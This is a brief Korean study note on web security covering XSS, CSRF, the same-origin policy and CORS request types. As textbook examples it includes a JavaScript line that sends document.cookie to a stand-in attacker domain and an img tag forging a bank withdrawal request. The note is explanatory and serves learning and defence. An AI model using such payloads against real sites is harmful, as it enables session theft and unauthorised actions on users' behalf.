# 보안

- XSS (Cross-Site Scripting)

  - 쿠키에 민감 정보를 두면 안됨. XSS 를 이용하여 탈취할 수 있음

  ```javascript
  (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  ```

- CSRF (Cross-Site Request Forgery)

  - 인증에 쿠키만 사용한다면 사용자가 의도하지 않은 동작이 실행되게 할 수 있음 [CSRF](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)
  
  ```javascript
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
  ```
  
- SOP (Same-Origin Policy) / CORS (Cross-Origin Resource Sharing)

  - SOP
    <img>, <script> 외의 fetch 요청은 Origin (protocol + domain + port) 이 다른 서버에서 응답을 받는 것이 불가

  - CORS
    단, 응답의 Access-Control-Allow-Origin 헤더에 요청하는 Origin 이 들어있으면 가능

    - Preflight Request (브라우저 구현)

      브라우저가 OPTIONS 요청을 먼저 전송하여 응답의 Access-Control-Allow-Origin 헤더가 유효할 때에만 실제 요청하는 방식

    - Simple Request
      GET 요청의 응답에 담긴 Access-Control-Allow-Origin 을 확인

    - Credentialed Request
      fetch API 호출시 옵션으로 { credentials : 'include' } 전달하여 쿠키 정보를 담아 요청하는 방식. 기본값은 same-origin. (incldue, same-origin, omit 정책이 있음)

  - 로컬에서는 webpack dev server 에서 프록시를 이용할 수 있다

  - 참고
    https://evan-moon.github.io/2020/05/21/about-cors/

